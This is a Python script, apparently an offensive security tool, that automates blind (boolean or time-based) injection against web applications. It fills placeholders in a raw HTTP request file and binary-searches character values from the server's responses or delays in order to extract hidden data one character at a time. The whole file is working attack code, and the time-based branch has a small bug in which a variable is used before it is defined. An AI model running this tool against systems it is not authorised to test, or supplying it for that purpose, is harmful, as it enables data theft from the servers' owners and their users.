#coding=utf-8
import requests
import warnings
import argparse
import re
import requests

import sys
import ssl
import socket
import base64
import os
from urllib.parse import urlparse
from xml.dom.minidom import parse
#import string
#string.printable
from time import sleep
warnings.filterwarnings('ignore')

import logging

ASCII = False
ASCII_OUTPUT = False
BLUE = "\x1b[94m"
GREEN = '\x1b[92m'
YELLOW = "\x1b[93m"
RED = "\x1b[91m"
BOLD_RED = "\x1b[91m"
RESET = "\x1b[0m"

class CustomFormatter(logging.Formatter):
    blue = BLUE
    green = GREEN
    yellow = YELLOW
    red = RED
    bold_red = BOLD_RED
    reset = RESET
    format = "%(asctime)s %(name)s:%(lineno)s >>> %(message)s"

    FORMATS = {
        logging.DEBUG: green + "[%(levelname)s] " + reset + format,
        logging.INFO: blue + "[%(levelname)s] " + reset + format,
        logging.WARNING: yellow + "[%(levelname)s] " + reset + format,
        logging.ERROR: red + "[%(levelname)s] " + reset + format,
        logging.CRITICAL: bold_red + "[%(levelname)s] " + reset + format,
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

logger = logging.getLogger(__name__)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
ch.setFormatter(CustomFormatter())
logger.addHandler(ch)

'''
stdoutHandler = logging.StreamHandler(stream=sys.stdout)
stderrHandler = logging.StreamHandler(stream=sys.stderr)
#fmt = logging.Formatter("[%(levelname)s] %(name)s: %(asctime)s %(filename)s:%(lineno)s %(process)d >>> %(message)s")
fmt = logging.Formatter("[%(levelname)s] %(asctime)s %(name)s:%(lineno)s >>> %(message)s")
stdoutHandler.setLevel(logging.DEBUG)
stderrHandler.setLevel(logging.ERROR)
stdoutHandler.setFormatter(fmt)
stderrHandler.setFormatter(fmt)
logger.addHandler(stdoutHandler)
logger.addHandler(stderrHandler)
'''

def brute_force(search_ranges,proxy,true_txt,time_sec,raw_request_with_payload,tls,operator,sleep_time,increase_count):
    stacking_str = ""
    all_num = []
    base_num = 0
    tmp = re.findall(r"{INC_(\d+)}",raw_request_with_payload)
    if len(tmp) > 0:
        base_num = int(tmp[0])
    base_num_str = "{INC_" + str(base_num) + "}"
    request_time = 0
    if time_sec != None and true_txt == None:
        host = re.findall(r"\n[Hh]ost:(.*?)\n",raw_request_with_num_ope)
        if len(host) == 0:
            logger.error("not found host in request file")
            return None
        host = host[0].strip()
        url = "https://{}/".format(host) if tls else "http://{}/".format(host)
        r = requests.get(url,timeout=10,verify=False)
        request_time = r.elapsed.total_seconds()
        logger.debug("time based get request used {}s".format(request_time))

    for i in range(0,increase_count):
        inc_num = base_num + i
        raw_request_with_num_ope = raw_request_with_payload.replace("{STP}",stacking_str)
        raw_request_with_num_ope = raw_request_with_num_ope.replace(base_num_str,str(inc_num))
        for (start,end) in search_ranges:
            ret = binary_search(start,end,proxy,true_txt,time_sec,request_time,raw_request_with_num_ope,tls,operator,sleep_time)
            if ret != None:
                if ASCII_OUTPUT:
                    stacking_str += chr(ret)
                else:
                    all_num.append(ret)
                break
    if ASCII_OUTPUT:
        logger.info("found {}".format(stacking_str))
    else:
        logger.info("found {}".format(all_num))

def binary_search(low,high,proxy,true_txt,time_sec,request_time,raw_request_with_num_ope,tls,operator,sleep_time):
    global ASCII_OUTPUT
    global ASCII

    if ASCII and ("<" in operator or ">" in operator):
        logger.error("operators that determine the range cannot be used when brute force ascii char")
        return None
    
    logger.debug("low:{}, high:{}, proxy:{}, true txt:{}, is_tls:{}, operator:{}".format(low,high,proxy,true_txt,tls,operator))
    host = re.findall(r"\n[Hh]ost:(.*?)\n",raw_request_with_num_ope)
    if len(host) == 0:
        logger.error("not found host in request file")
        return None
    host = host[0].strip()
    res = raw_request_with_num_ope.split()[1]
    # url = "https://{}{}".format(host.strip(),res) if tls else "http://{}{}".format(host.strip(),res)
    # logger.debug(url)
    '''
    host = host[0].strip()
    host_port = host.split(":")
    logger.debug("{}".format(host))
    if len(host_port) == 2:
        host = host_port[0]
        port = int(host_port[1])
    else:
        host = host_port[0]
        port = 443 if tls else 80
    rsts = socket.getaddrinfo(host, None, socket.AF_UNSPEC)
    if len(rsts) == 0:
        print("unknown host")
        return None
    family, _, _, _, sockaddr = rsts[0]
    addr = sockaddr[0]
    '''
    # operator = ">"
    is_binary_search = True
    if operator not in [">","<",">=","<="]:
        is_binary_search = False
    if low == high and operator in [">","<",">=","<="]:
        operator = "="
    
    pre_bool = True
    num_in_left = True
    num_index = str(raw_request_with_num_ope).index("{BFP}")
    ope_index = str(raw_request_with_num_ope).index("{OPE}")
    
    if num_index < 0 or ope_index < 0:
        logger.error("need operator mark in request")
        return None
    
    if num_index > ope_index:
        num_in_left = False
    
    greater_than_num = True # 爆破对象大于数字
    if num_in_left:
        if operator in [">",">=","="]:
            greater_than_num = False
        else:
            greater_than_num = True
    else:
        if operator in [">",">=","="]:
            greater_than_num = True
        else:
            greater_than_num = False
    
    logger.debug("object greater than num {}".format(greater_than_num))
    
    index = 0
    last_tow_num = False
    pre_num = None
    while True:
        if operator == "=" and not is_binary_search:
            num = low + index
        else:
            if greater_than_num:
                num = int((high - low) / 2) + low
            else:
                num = high - int((high - low) / 2) 
        if num > high:
            break
        index += 1
        logger.debug("{} {} {}".format(low,num,high))
        if high - low == 1 and not last_tow_num: # 高低值仅差1时，调整操作符为“=”，测试最后两个值。
            is_binary_search = False
            last_tow_num = True
            num = low
            index = 1
            operator = "="
        if ASCII:
            req = str(raw_request_with_num_ope).replace('{BFP}',chr(num)).replace('{OPE}',operator)
        else:
            req = str(raw_request_with_num_ope).replace('{BFP}',str(num)).replace('{OPE}',operator)
        req = re.split("\r?\n\r?\n",req,maxsplit=1)
        req_body = None
        if len(req) == 2:
            req_body = req[1]
        raw_headers = req[0].split("\n")

        method_res = raw_headers[0].split()
        headers = {}

        # logger.debug("{}".format(raw_headers))
        for l in raw_headers[1:]:
            tmp = l.split(": ",1)
            if len(tmp) != 2:
                continue
            key = tmp[0].strip()
            value = tmp[1].strip()
            if key.lower() == "content-length":
                if req_body != None:
                    value = str(len(req_body))
            headers[key] = value
        
        method = method_res[0]
        res = method_res[1]
        # logger.debug("{}".format(headers))
        if headers.get("Host") != None:
            url = "https://{}{}".format(headers["Host"],res) if tls else "http://{}{}".format(headers["Host"],res)
        elif headers.get("host") != None:
            url = "https://{}{}".format(headers["host"],res) if tls else "http://{}{}".format(headers["host"],res)
        else:
            logger.error("not found host")
            return None
        
        r = requests.request(method=method,url=url,headers=headers,timeout=(10+time_sec) if time_sec !=None else 10,verify=False,data=req_body, proxies={"http":proxy,"https":proxy})
        # logger.debug(r.content)
        if true_txt != None:
            if true_txt in r.content.decode('utf-8'):
                pre_bool = True
            else:
                pre_bool = False
        else:
            t = r.elapsed.total_seconds() - request_time
            if t >= time_sec:
                logger.debug("time based server used {}s".format(t))
                pre_bool = True
            else:
                pre_bool = False
        
        if greater_than_num:
            if pre_bool:  # 大于
                if operator == "=":
                    logger.info("found {}".format(f"{BLUE}{chr(num) if ASCII_OUTPUT else num}{RESET}"))
                    return num
                    break
                logger.debug("1 greater than {}".format(num))
                if operator in [">",">=","<","<="]:
                    low = num
            else:   # 小于等于
                logger.debug("1 less than {}".format(num))
                high = num
        else:
            if pre_bool: # 小于
                if operator == "=":
                    logger.info("found {}".format(f"{BLUE}{chr(num) if ASCII_OUTPUT else num}{RESET}"))
                    return num
                    break
                logger.debug("2 less than {} {}".format(num,operator))
                high = num
            else: # 大于等于
                logger.debug("2 greater than {}".format(num,operator))
                if operator in [">",">=","<","<="]:
                    low = num
        if is_binary_search and operator not in [">",">=","<","<="]:
            break
        if pre_num != None and pre_num == num and not last_tow_num:
            logger.error("error! check your operator and true txt, found always true condition.")
            break
        pre_num = num
        sleep(sleep_time/1000)
    return None

def main():
    parser = argparse.ArgumentParser()
    grp = parser.add_mutually_exclusive_group(required=True)
    grp.add_argument("--true-txt",dest="true_txt",help="in response txt when true")
    grp.add_argument("--time-bind",dest="time_sec",default=0,type=int,help="time based delay secs")

    parser.add_argument("--operator",dest="operator",choices=[">",">=","=","<=","<","like","LIKE"],default=">",help="specific the operator point {OPE} replaced symbol, default \">\"")
    parser.add_argument("-l","--log-file",dest="raw_request_file",help='raw request file with payload, brute force point marked by {BFP}, operator marked by {OPE}, stacking point marked by {STP}, increase num marked by {INC_num}',required=True)
    parser.add_argument("--tls",action="store_true",help="https connection")
    parser.add_argument("--delay",dest="sleep_time",default=100,type=int,help="delay time after one request")
    parser.add_argument("--ascii",action="store_true",help="brute force ascii char in ranges")
    parser.add_argument("--inc-count",default=1,type=int,dest="increase_count",help="{INC_num} increase count")
    parser.add_argument("--out-ascii",dest="out_ascii",action="store_true",help="print ascii char")
    parser.add_argument("--proxy",dest="proxy",help="http proxy")
    # args_group = parser.add_argument_group()
    parser.add_argument("--ranges",dest="ranges",help="search ranges, example[_0-9A-Za-z]: \"48-57,65-90,95,97-122. default 33-126", default="33-126")
    # parser.add_argument("--ascii-pb",dest="printable",action="store_true",help="this is default setting when brute force printable character, search ascii printable char range 33-126")
    parser.add_argument("--log-level",dest="log_level",default="INFO",choices=["DEBUG","INFO","ERROR"],help="set log level, default INFO")
    search_ranges = []
    args = parser.parse_args()
    if args.log_level == "DEBUG":
        logger.setLevel(logging.DEBUG)
    if args.log_level == "INFO":
        logger.setLevel(logging.INFO)
    if args.log_level == "ERROR":
        logger.setLevel(logging.ERROR)

    global ASCII_OUTPUT
    global ASCII
    ASCII_OUTPUT = args.out_ascii
    ASCII = args.ascii
    rs = args.ranges.split(",")
    for r in rs:
        m = re.findall("(\d+)-(\d+)",r.strip())
        if len(m) == 1:
            start = int(m[0][0])
            end = int(m[0][1])
            if start < end:
                search_ranges.append((start,end))
        m = re.findall("\d+",r.strip())
        if len(m) == 1:
            start = int(m[0])
            end = start
            search_ranges.append((start,end))
    f = open(args.raw_request_file,'r+',encoding='utf-8')
    raw_request_with_payload = f.read()
    brute_force(search_ranges,args.proxy,args.true_txt,args.time_sec,raw_request_with_payload,args.tls,args.operator,args.sleep_time,args.increase_count)

if __name__ == '__main__':
    main()